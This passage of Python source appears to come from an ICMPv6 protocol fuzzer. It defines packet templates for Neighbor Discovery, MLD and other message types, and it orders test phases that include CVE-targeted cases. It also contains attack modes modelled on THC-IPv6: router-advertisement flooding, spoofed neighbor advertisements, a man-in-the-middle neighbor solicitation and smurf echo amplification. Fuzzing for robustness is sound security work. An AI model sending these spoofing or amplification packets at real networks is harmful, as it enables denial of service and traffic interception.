                        Word("Sequence", 1, endian=">", fuzzable=True),
                    ),
                ),
                Block(
                    "Data",
                    children=(
                        SmartString("Payload", "icmpv6-echo-request", max_len=1024, fuzzable=True),
                    ),
                ),
            ),
        )

        # Echo Reply (Type 129)
        echo_reply = Request(
            "ICMPv6_Echo_Reply",
            children=(
                Block(
                    "ICMPv6_Header",
                    children=(
                        Byte("Type", 129, fuzzable=True),
                        Byte("Code", 0, fuzzable=True),
                        Checksum(
                            "Checksum",
                            block_name="ICMPv6_Header",
                            algorithm=self._icmpv6_checksum_wrapper,
                            length=2,
                            endian=">",
                            fuzzable=False,
                        ),
                        Word("Identifier", 1, endian=">", fuzzable=True),
                        Word("Sequence", 1, endian=">", fuzzable=True),
                    ),
                ),
                Block(
                    "Data",
                    children=(
                        SmartString("Payload", "icmpv6-echo-reply", max_len=1024, fuzzable=True),
                    ),
                ),
            ),
        )

        # === Multicast Listener Discovery (MLD) ===

        # MLDv2 Multicast Listener Query (Type 130)
        mld_query = Request(
            "ICMPv6_MLD_Query",
            children=(
                Block(
                    "ICMPv6_Header",
                    children=(
                        Byte("Type", 130, fuzzable=True),
                        Byte("Code", 0, fuzzable=True),
                        Checksum(
                            "Checksum",
                            block_name="ICMPv6_Header",
                            algorithm=self._icmpv6_checksum_wrapper,
                            length=2,
                            endian=">",
                            fuzzable=False,
                        ),
                        Word("Max_Response_Code", 10000, endian=">", fuzzable=True),
                        Word("Reserved", 0, endian=">", fuzzable=True),
                        # Multicast Address
                        SmartBytes(
                            "Multicast_Address",
                            self._ipv6_to_bytes("ff02::1"),
                            size=16,
                            fuzzable=True,
                        ),
                    ),
                ),
                # MLDv2 specific fields
                Block(
                    "MLDv2_Fields",
                    children=(
                        Byte("Flags", 0x02, fuzzable=True),  # S flag, QRV
                        Byte("QQIC", 125, fuzzable=True),  # Query Interval
                        Word("Number_of_Sources", 0, endian=">", fuzzable=True),
                    ),
                )
                if mld_version == 2
                else Static("", ""),
            ),
        )

        # MLDv2 Multicast Listener Report (Type 143 for v2)
        mld_report = Request(
            "ICMPv6_MLDv2_Report",
            children=(
                Block(
                    "ICMPv6_Header",
                    children=(
                        Byte("Type", 143 if mld_version == 2 else 131, fuzzable=True),
                        Byte("Code", 0, fuzzable=True),
                        Checksum(
                            "Checksum",
                            block_name="ICMPv6_Header",
                            algorithm=self._icmpv6_checksum_wrapper,
                            length=2,
                            endian=">",
                            fuzzable=False,
                        ),
                        Word("Reserved", 0, endian=">", fuzzable=True),
                        Word("Number_of_Records", 1, endian=">", fuzzable=True),
                    ),
                ),
                # Multicast Address Record
                Block(
                    "Address_Record",
                    children=(
                        Byte("Record_Type", 1, fuzzable=True),  # 1=MODE_IS_INCLUDE
                        Byte("Aux_Data_Len", 0, fuzzable=True),
                        Word("Number_of_Sources", 0, endian=">", fuzzable=True),
                        SmartBytes(
                            "Multicast_Address",
                            self._ipv6_to_bytes("ff02::2"),
                            size=16,
                            fuzzable=True,
                        ),
                    ),
                ),
            ),
        )

        # === Neighbor Discovery Protocol (NDP) ===

        # Router Solicitation (Type 133)
        router_solicitation = Request(
            "ICMPv6_Router_Solicitation",
            children=(
                Block(
                    "ICMPv6_Header",
                    children=(
                        Byte("Type", 133, fuzzable=True),
                        Byte("Code", 0, fuzzable=True),
                        Checksum(
                            "Checksum",
                            block_name="ICMPv6_Header",
                            algorithm=self._icmpv6_checksum_wrapper,
                            length=2,
                            endian=">",
                            fuzzable=False,
                        ),
                        DWord("Reserved", 0, endian=">", fuzzable=True),
                    ),
                ),
                # NDP Options
                Block(
                    "Options",
                    children=(
                        # Source Link-Layer Address Option
                        Byte("Option_Type", 1, fuzzable=True),
                        Byte("Option_Length", 1, fuzzable=True),  # In 8-byte units
                        SmartBytes(
                            "Link_Address", b"\x00\x11\x22\x33\x44\x55", size=6, fuzzable=True
                        ),
                    ),
                )
                if include_options
                else Static("", ""),
            ),
        )

        # Router Advertisement (Type 134)
        router_advertisement = Request(
            "ICMPv6_Router_Advertisement",
            children=(
                Block(
                    "ICMPv6_Header",
                    children=(
                        Byte("Type", 134, fuzzable=True),
                        Byte("Code", 0, fuzzable=True),
                        Checksum(
                            "Checksum",
                            block_name="ICMPv6_Header",
                            algorithm=self._icmpv6_checksum_wrapper,
                            length=2,
                            endian=">",
                            fuzzable=False,
                        ),
                        Byte("Cur_Hop_Limit", 64, fuzzable=True),
                        Byte("Flags", 0x00, fuzzable=True),  # M, O flags
                        Word("Router_Lifetime", 1800, endian=">", fuzzable=True),
                        DWord("Reachable_Time", 0, endian=">", fuzzable=True),
                        DWord("Retrans_Timer", 0, endian=">", fuzzable=True),
                    ),
                ),
                # Options
                Block(
                    "Options",
                    children=(
                        # Source Link-Layer Address
                        Block(
                            "Source_Link_Option",
                            children=(
                                Byte("Type", 1, fuzzable=True),
                                Byte("Length", 1, fuzzable=True),
                                SmartBytes(
                                    "MAC", b"\x00\x11\x22\x33\x44\x55", size=6, fuzzable=True
                                ),
                            ),
                        ),
                        # Prefix Information
                        Block(
                            "Prefix_Option",
                            children=(
                                Byte("Type", 3, fuzzable=True),
                                Byte("Length", 4, fuzzable=True),  # 32 bytes
                                Byte("Prefix_Length", 64, fuzzable=True),
                                Byte("Flags", 0xC0, fuzzable=True),  # L, A flags
                                DWord("Valid_Lifetime", 2592000, endian=">", fuzzable=True),
                                DWord("Preferred_Lifetime", 604800, endian=">", fuzzable=True),
                                DWord("Reserved", 0, endian=">", fuzzable=True),
                                SmartBytes(
                                    "Prefix",
                                    self._ipv6_to_bytes("2001:db8::"),
                                    size=16,
                                    fuzzable=True,
                                ),
                            ),
                        ),
                        # MTU Option
                        Block(
                            "MTU_Option",
                            children=(
                                Byte("Type", 5, fuzzable=True),
                                Byte("Length", 1, fuzzable=True),
                                Word("Reserved", 0, endian=">", fuzzable=True),
                                DWord("MTU", 1500, endian=">", fuzzable=True),
                            ),
                        ),
                    ),
                )
                if include_options
                else Static("", ""),
            ),
        )

        # Neighbor Solicitation (Type 135)
        neighbor_solicitation = Request(
            "ICMPv6_Neighbor_Solicitation",
            children=(
                Block(
                    "ICMPv6_Header",
                    children=(
                        Byte("Type", 135, fuzzable=True),
                        Byte("Code", 0, fuzzable=True),
                        Checksum(
                            "Checksum",
                            block_name="ICMPv6_Header",
                            algorithm=self._icmpv6_checksum_wrapper,
                            length=2,
                            endian=">",
                            fuzzable=False,
                        ),
                        DWord("Reserved", 0, endian=">", fuzzable=True),
                        SmartBytes(
                            "Target_Address", self._ipv6_to_bytes(dest_ip), size=16, fuzzable=True
                        ),
                    ),
                ),
                # Source Link-Layer Address Option
                Block(
                    "Source_Link_Option",
                    children=(
                        Byte("Type", 1, fuzzable=True),
                        Byte("Length", 1, fuzzable=True),
                        SmartBytes("MAC", b"\x00\x11\x22\x33\x44\x55", size=6, fuzzable=True),
                    ),
                )
                if include_options
                else Static("", ""),
            ),
        )

        # Neighbor Advertisement (Type 136)
        neighbor_advertisement = Request(
            "ICMPv6_Neighbor_Advertisement",
            children=(
                Block(
                    "ICMPv6_Header",
                    children=(
                        Byte("Type", 136, fuzzable=True),
                        Byte("Code", 0, fuzzable=True),
                        Checksum(
                            "Checksum",
                            block_name="ICMPv6_Header",
                            algorithm=self._icmpv6_checksum_wrapper,
                            length=2,
                            endian=">",
                            fuzzable=False,
                        ),
                        Byte("Flags", 0x60, fuzzable=True),  # R, S, O flags
                        SmartBytes("Reserved", b"\x00\x00\x00", size=3, fuzzable=True),
                        SmartBytes(
                            "Target_Address", self._ipv6_to_bytes(source_ip), size=16, fuzzable=True
                        ),
                    ),
                ),
                # Target Link-Layer Address Option
                Block(
                    "Target_Link_Option",
                    children=(
                        Byte("Type", 2, fuzzable=True),
                        Byte("Length", 1, fuzzable=True),
                        SmartBytes("MAC", b"\x00\x11\x22\x33\x44\x55", size=6, fuzzable=True),
                    ),
                )
                if include_options
                else Static("", ""),
            ),
        )

        # Redirect (Type 137)
        redirect = Request(
            "ICMPv6_Redirect",
            children=(
                Block(
                    "ICMPv6_Header",
                    children=(
                        Byte("Type", 137, fuzzable=True),
                        Byte("Code", 0, fuzzable=True),
                        Checksum(
                            "Checksum",
                            block_name="ICMPv6_Header",
                            algorithm=self._icmpv6_checksum_wrapper,
                            length=2,
                            endian=">",
                            fuzzable=False,
                        ),
                        DWord("Reserved", 0, endian=">", fuzzable=True),
                        SmartBytes(
                            "Target_Address",
                            self._ipv6_to_bytes("fe80::ff"),
                            size=16,
                            fuzzable=True,
                        ),
                        SmartBytes(
                            "Destination_Address",
                            self._ipv6_to_bytes(dest_ip),
                            size=16,
                            fuzzable=True,
                        ),
                    ),
                ),
                # Options
                Block(
                    "Options",
                    children=(
                        # Target Link-Layer Address
                        Block(
                            "Target_Link_Option",
                            children=(
                                Byte("Type", 2, fuzzable=True),
                                Byte("Length", 1, fuzzable=True),
                                SmartBytes(
                                    "MAC", b"\xff\xff\xff\xff\xff\xff", size=6, fuzzable=True
                                ),
                            ),
                        ),
                        # Redirected Header
                        Block(
                            "Redirected_Header_Option",
                            children=(
                                Byte("Type", 4, fuzzable=True),
                                Byte("Length", 8, fuzzable=True),  # Variable
                                SmartBytes("Reserved", b"\x00" * 6, size=6, fuzzable=True),
                                # Original packet that triggered redirect
                                SmartBytes(
                                    "Original_Packet",
                                    b"\x60" + b"\x00" * 47,
                                    size=48,
                                    fuzzable=True,
                                ),
                            ),
                        ),
                    ),
                )
                if include_options
                else Static("", ""),
            ),
        )

        # === Mobile IPv6 Messages ===

        # Home Agent Address Discovery Request (Type 144)
        haad_request = Request(
            "ICMPv6_HAAD_Request",
            children=(
                Block(
                    "ICMPv6_Header",
                    children=(
                        Byte("Type", 144, fuzzable=True),
                        Byte("Code", 0, fuzzable=True),
                        Checksum(
                            "Checksum",
                            block_name="ICMPv6_Header",
                            algorithm=self._icmpv6_checksum_wrapper,
                            length=2,
                            endian=">",
                            fuzzable=False,
                        ),
                        Word("Identifier", 1, endian=">", fuzzable=True),
                        Word("Reserved", 0, endian=">", fuzzable=True),
                    ),
                ),
            ),
        )

        # Home Agent Address Discovery Reply (Type 145)
        haad_reply = Request(
            "ICMPv6_HAAD_Reply",
            children=(
                Block(
                    "ICMPv6_Header",
                    children=(
                        Byte("Type", 145, fuzzable=True),
                        Byte("Code", 0, fuzzable=True),
                        Checksum(
                            "Checksum",
                            block_name="ICMPv6_Header",
                            algorithm=self._icmpv6_checksum_wrapper,
                            length=2,
                            endian=">",
                            fuzzable=False,
                        ),
                        Word("Identifier", 1, endian=">", fuzzable=True),
                        Word("Reserved", 0, endian=">", fuzzable=True),
                    ),
                ),
                # Home Agent addresses
                Block(
                    "Home_Agents",
                    children=(
                        SmartBytes(
                            "HA_Address_1",
                            self._ipv6_to_bytes("2001:db8::1"),
                            size=16,
                            fuzzable=True,
                        ),
                    ),
                ),
            ),
        )

        # === Secure Neighbor Discovery (SEND) ===

        # Certification Path Solicitation (Type 148)
        cps = Request(
            "ICMPv6_CPS",
            children=(
                Block(
                    "ICMPv6_Header",
                    children=(
                        Byte("Type", 148, fuzzable=True),
                        Byte("Code", 0, fuzzable=True),
                        Checksum(
                            "Checksum",
                            block_name="ICMPv6_Header",
                            algorithm=self._icmpv6_checksum_wrapper,
                            length=2,
                            endian=">",
                            fuzzable=False,
                        ),
                        Word("Identifier", 1, endian=">", fuzzable=True),
                        Word("Component", 0, endian=">", fuzzable=True),
                    ),
                ),
                # Trust Anchor option
                Block(
                    "Trust_Anchor_Option",
                    children=(
                        Byte("Type", 15, fuzzable=True),
                        Byte("Length", 3, fuzzable=True),
                        Byte("Name_Type", 1, fuzzable=True),
                        Byte("Pad_Length", 0, fuzzable=True),
                        SmartString("Name", "TestCA", max_len=16, fuzzable=True),
                    ),
                )
                if include_options
                else Static("", ""),
            ),
        )

        # === Multicast Router Discovery ===

        # Multicast Router Advertisement (Type 151)
        mrd_advertisement = Request(
            "ICMPv6_MRD_Advertisement",
            children=(
                Block(
                    "ICMPv6_Header",
                    children=(
                        Byte("Type", 151, fuzzable=True),
                        Byte("Code", 0, fuzzable=True),
                        Checksum(
                            "Checksum",
                            block_name="ICMPv6_Header",
                            algorithm=self._icmpv6_checksum_wrapper,
                            length=2,
                            endian=">",
                            fuzzable=False,
                        ),
                        Byte("Query_Interval", 125, fuzzable=True),
                        Byte("Robustness", 2, fuzzable=True),
                        Word("Reserved", 0, endian=">", fuzzable=True),
                    ),
                ),
            ),
        )

        # === Node Information Queries ===

        # Node Information Query (Type 139)
        ni_query = Request(
            "ICMPv6_NI_Query",
            children=(
                Block(
                    "ICMPv6_Header",
                    children=(
                        Byte("Type", 139, fuzzable=True),
                        Byte("Code", 0, fuzzable=True),  # 0=IPv6 addr, 1=name, 2=IPv4 addr
                        Checksum(
                            "Checksum",
                            block_name="ICMPv6_Header",
                            algorithm=self._icmpv6_checksum_wrapper,
                            length=2,
                            endian=">",
                            fuzzable=False,
                        ),
                        Word("Qtype", 2, endian=">", fuzzable=True),  # Query type
                        Word("Flags", 0, endian=">", fuzzable=True),
                        QWord("Nonce", 0x1234567890ABCDEF, endian=">", fuzzable=True),
                    ),
                ),
                # Query data (varies by code/qtype)
                Block(
                    "Query_Data",
                    children=(SmartBytes("Data", b"\x00" * 16, size=16, fuzzable=True),),
                ),
            ),
        )

        # Node Information Reply (Type 140)
        ni_reply = Request(
            "ICMPv6_NI_Reply",
            children=(
                Block(
                    "ICMPv6_Header",
                    children=(
                        Byte("Type", 140, fuzzable=True),
                        Byte("Code", 0, fuzzable=True),  # 0=success, 1=refused, 2=unknown
                        Checksum(
                            "Checksum",
                            block_name="ICMPv6_Header",
                            algorithm=self._icmpv6_checksum_wrapper,
                            length=2,
                            endian=">",
                            fuzzable=False,
                        ),
                        Word("Qtype", 2, endian=">", fuzzable=True),
                        Word("Flags", 0, endian=">", fuzzable=True),
                        QWord("Nonce", 0x1234567890ABCDEF, endian=">", fuzzable=True),
                    ),
                ),
                # Reply data
                Block(
                    "Reply_Data",
                    children=(SmartString("Data", "node.example.com", max_len=255, fuzzable=True),),
                ),
            ),
        )

        # === THC-IPv6 Attack Modes ===

        if attack_mode == "flood" or attack_mode == "normal":
            # THC-IPv6 flood_router6: Router Advertisement flooding
            flood_router = Request(
                "ICMPv6_Flood_Router",
                children=(
                    Block(
                        "ICMPv6_Header",
                        children=(
                            Byte("Type", 134, fuzzable=False),  # Router Advertisement
                            Byte("Code", 0, fuzzable=True),
                            Checksum(
                                "Checksum",
                                block_name="ICMPv6_Header",
                                algorithm=self._icmpv6_checksum_wrapper,
                                length=2,
                                endian=">",
                                fuzzable=False,
                            ),
                            Byte("Cur_Hop_Limit", 64, fuzzable=True),
                            Byte("Flags", 0xC0, fuzzable=True),  # Managed + Other config
                            Word(
                                "Router_Lifetime", 0xFFFF, endian=">", fuzzable=True
                            ),  # Max lifetime
                            DWord("Reachable_Time", 0, endian=">", fuzzable=True),
                            DWord("Retrans_Timer", 0, endian=">", fuzzable=True),
                        ),
                    ),
                    # Source Link-Layer Address (spoofed)
                    Block(
                        "SLLA_Option",
                        children=(
                            Byte("Type", 1, fuzzable=True),
                            Byte("Length", 1, fuzzable=True),
                            SmartBytes(
                                "MAC", self._mac_to_bytes(target_mac), size=6, fuzzable=True
                            ),
                        ),
                    ),
                    # Prefix Information with high priority
                    Block(
                        "Prefix_Option",
                        children=(
                            Byte("Type", 3, fuzzable=True),
                            Byte("Length", 4, fuzzable=True),
                            Byte("Prefix_Length", 64, fuzzable=True),
                            Byte("Flags", 0xC0, fuzzable=True),  # L + A flags
                            DWord("Valid_Lifetime", 0xFFFFFFFF, endian=">", fuzzable=True),
                            DWord("Preferred_Lifetime", 0xFFFFFFFF, endian=">", fuzzable=True),
                            DWord("Reserved2", 0, endian=">", fuzzable=True),
                            SmartBytes(
                                "Prefix", self._ipv6_to_bytes("2001:db8::"), size=16, fuzzable=True
                            ),
                        ),
                    ),
                ),
            )

        if attack_mode == "spoof" or attack_mode == "normal":
            # THC-IPv6 fake_advertiser6: Neighbor Advertisement spoofing
            fake_advertiser = Request(
                "ICMPv6_Fake_Advertiser",
                children=(
                    Block(
                        "ICMPv6_Header",
                        children=(
                            Byte("Type", 136, fuzzable=False),  # Neighbor Advertisement
                            Byte("Code", 0, fuzzable=True),
                            Checksum(
                                "Checksum",
                                block_name="ICMPv6_Header",
                                algorithm=self._icmpv6_checksum_wrapper,
                                length=2,
                                endian=">",
                                fuzzable=False,
                            ),
                            DWord(
                                "Flags_Reserved", 0xE0000000, endian=">", fuzzable=True
                            ),  # R+S+O flags
                            SmartBytes(
                                "Target_Address",
                                self._ipv6_to_bytes(source_ip),
                                size=16,
                                fuzzable=True,
                            ),
                        ),
                    ),
                    # Target Link-Layer Address (spoofed to attacker)
                    Block(
                        "TLLA_Option",
                        children=(
                            Byte("Type", 2, fuzzable=True),
                            Byte("Length", 1, fuzzable=True),
                            SmartBytes(
                                "MAC", self._mac_to_bytes(target_mac), size=6, fuzzable=True
                            ),
                        ),
                    ),
                ),
            )

        if attack_mode == "parasite" or attack_mode == "normal":
            # THC-IPv6 parasite6: Man-in-the-middle via NS
            parasite_ns = Request(
                "ICMPv6_Parasite_NS",
                children=(
                    Block(
                        "ICMPv6_Header",
                        children=(
                            Byte("Type", 135, fuzzable=False),  # Neighbor Solicitation
                            Byte("Code", 0, fuzzable=True),
                            Checksum(
                                "Checksum",
                                block_name="ICMPv6_Header",
                                algorithm=self._icmpv6_checksum_wrapper,
                                length=2,
                                endian=">",
                                fuzzable=False,
                            ),
                            DWord("Reserved", 0, endian=">", fuzzable=True),
                            SmartBytes(
                                "Target_Address",
                                self._ipv6_to_bytes(dest_ip),
                                size=16,
                                fuzzable=True,
                            ),
                        ),
                    ),
                    # Source Link-Layer Address (attacker's MAC)
                    Block(
                        "SLLA_Option",
                        children=(
                            Byte("Type", 1, fuzzable=True),
                            Byte("Length", 1, fuzzable=True),
                            SmartBytes(
                                "MAC", self._mac_to_bytes(target_mac), size=6, fuzzable=True
                            ),
                        ),
                    ),
                ),
            )

        if attack_mode == "smurf" or attack_mode == "normal":
            # THC-IPv6 smurf6: ICMPv6 echo amplification
            smurf_echo = Request(
                "ICMPv6_Smurf_Echo",
                children=(
                    Block(
                        "ICMPv6_Header",
                        children=(
                            Byte("Type", 128, fuzzable=False),  # Echo Request
                            Byte("Code", 0, fuzzable=True),
                            Checksum(
                                "Checksum",
                                block_name="ICMPv6_Header",
                                algorithm=self._icmpv6_checksum_wrapper,
                                length=2,
                                endian=">",
                                fuzzable=False,
                            ),
                            Word("Identifier", 0x1337, endian=">", fuzzable=True),
                            Word("Sequence", 1, endian=">", fuzzable=True),
                        ),
                    ),
                    # Large payload for amplification
                    Block(
                        "Data",
                        children=(
                            SmartString("Payload", "SMURF" * 300, max_len=1400, fuzzable=True),
                        ),
                    ),
                ),
            )

        # ============================================================
        # OPTIMIZED SESSION CONNECTION ORDER
        # ============================================================
        # Phase 1: Quick Coverage (first ~30 seconds)
        # Phase 2: High-crash tests (30s-2m)
        # Phase 3: CVE-targeted (2m-5m)
        # Phase 4: Boundary attacks (5m-10m)
        # Phase 5: Standard messages + THC-IPv6 attacks (10m+)
        # ============================================================

        # === PHASE 1: Quick Coverage ===
        # Touches all ICMPv6 types once for rapid breadth coverage
        if self.is_request_enabled("ICMPv6_Quick_Coverage"):
            self.session.connect(quick_coverage)

        # === PHASE 2: High-crash tests ===
        # RDNSS overflow, option length attacks, malformed packets
        if self.is_request_enabled("ICMPv6_RDNSS_Overflow"):
            self.session.connect(rdnss_overflow)
        if self.is_request_enabled("ICMPv6_Option_Length_Attack"):
            self.session.connect(option_length_attack)
        if self.is_request_enabled("ICMPv6_Malformed"):
            self.session.connect(malformed_icmpv6)
        if self.is_request_enabled("ICMPv6_Corrupted_Checksum"):
            self.session.connect(corrupted_checksum)

        # === PHASE 3: CVE-targeted tests ===
        if enable_cve_tests:
            if self.is_request_enabled("ICMPv6_Bad_Neighbor"):
                self.session.connect(bad_neighbor)
            if self.is_request_enabled("ICMPv6_Windows_IPv6_RCE"):
                self.session.connect(windows_ipv6_rce)
            if self.is_request_enabled("ICMPv6_MikroTik_RDNSS"):
                self.session.connect(mikrotik_rdnss)

        # === PHASE 4: Boundary attacks ===
        if self.is_request_enabled("ICMPv6_Type_Boundary"):
            self.session.connect(type_boundary)
        if self.is_request_enabled("ICMPv6_Code_Boundary"):
            self.session.connect(code_boundary)
        if self.is_request_enabled("ICMPv6_MTU_Boundary"):
            self.session.connect(mtu_boundary)
        if self.is_request_enabled("ICMPv6_Prefix_Boundary"):
            self.session.connect(prefix_boundary)

        # === PHASE 5: Standard messages with full mutation ===
        if attack_mode == "normal":
            # Error messages
            if self.is_request_enabled("ICMPv6_Dest_Unreachable"):
                self.session.connect(dest_unreachable)
            if self.is_request_enabled("ICMPv6_Packet_Too_Big"):
                self.session.connect(packet_too_big)
            if self.is_request_enabled("ICMPv6_Time_Exceeded"):
                self.session.connect(time_exceeded)
            if self.is_request_enabled("ICMPv6_Parameter_Problem"):
                self.session.connect(param_problem)

            # Informational
            if self.is_request_enabled("ICMPv6_Echo_Request"):
                self.session.connect(echo_request)
            if self.is_request_enabled("ICMPv6_Echo_Reply"):
                self.session.connect(echo_reply)

            # MLD
            if self.is_request_enabled("ICMPv6_MLD_Query"):
                self.session.connect(mld_query)
            if self.is_request_enabled("ICMPv6_MLDv2_Report"):
                self.session.connect(mld_report)

            # NDP (high-value targets for NDP attacks)
            if self.is_request_enabled("ICMPv6_Router_Solicitation"):
                self.session.connect(router_solicitation)
            if self.is_request_enabled("ICMPv6_Router_Advertisement"):
                self.session.connect(router_advertisement)
            if self.is_request_enabled("ICMPv6_Neighbor_Solicitation"):
                self.session.connect(neighbor_solicitation)
            if self.is_request_enabled("ICMPv6_Neighbor_Advertisement"):
                self.session.connect(neighbor_advertisement)
            if self.is_request_enabled("ICMPv6_Redirect"):
                self.session.connect(redirect)

            # Mobile IPv6
            if self.is_request_enabled("ICMPv6_HAAD_Request"):
                self.session.connect(haad_request)
            if self.is_request_enabled("ICMPv6_HAAD_Reply"):
                self.session.connect(haad_reply)

            # SEND
            if self.is_request_enabled("ICMPv6_CPS"):
                self.session.connect(cps)

            # MRD
            if self.is_request_enabled("ICMPv6_MRD_Advertisement"):
                self.session.connect(mrd_advertisement)

            # Node Information
            if self.is_request_enabled("ICMPv6_NI_Query"):
                self.session.connect(ni_query)
            if self.is_request_enabled("ICMPv6_NI_Reply"):
                self.session.connect(ni_reply)

        # === PHASE 5 continued: THC-IPv6 Attack Modes ===
        # These come last as they are more specialized attacks
        if (attack_mode == "flood" or attack_mode == "normal") and self.is_request_enabled(
            "ICMPv6_Flood_Router"
        ):
            self.session.connect(flood_router)

        if (attack_mode == "spoof" or attack_mode == "normal") and self.is_request_enabled(
            "ICMPv6_Fake_Advertiser"
        ):
            self.session.connect(fake_advertiser)

        if (attack_mode == "parasite" or attack_mode == "normal") and self.is_request_enabled(
            "ICMPv6_Parasite_NS"
        ):
            self.session.connect(parasite_ns)

        if (attack_mode == "smurf" or attack_mode == "normal") and self.is_request_enabled(
            "ICMPv6_Smurf_Echo"
        ):
            self.session.connect(smurf_echo)

    def setup_custom_monitors(self) -> Optional[List[BaseMonitor]]:
        """Setup ICMPv6-specific monitors"""
        monitors = []
        from ..monitors import PingMonitor

        # ICMPv6 ping monitor
        if self.config and hasattr(self.config, "target_ip"):
            ping_monitor = PingMonitor(
                host=self.config.target_ip, retry_count=3, ping_count=1, failure_threshold=2
            )
            monitors.append(ping_monitor)

        return monitors
